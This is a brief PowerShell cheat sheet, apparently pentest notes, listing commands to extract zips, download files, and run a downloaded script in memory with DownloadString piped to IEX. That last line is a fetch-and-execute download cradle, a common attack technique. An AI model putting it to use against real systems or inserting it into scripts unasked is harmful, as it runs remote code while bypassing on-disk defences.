# Extract zip file
`Expand-Archive <FILE>.zip`

# Download to disk
## using .Net WebClient:
`(New-Object System.Net.WebClient).DownloadFile('<URL>', <OUTPUTPATH>)`

## using Invoke-WebRequest
`IWR '<URL>' -OutFile <FILENAME>`

# Execute powershell in memory
`(New-Object Net.WebClient).DownloadString('<URL>') | IEX`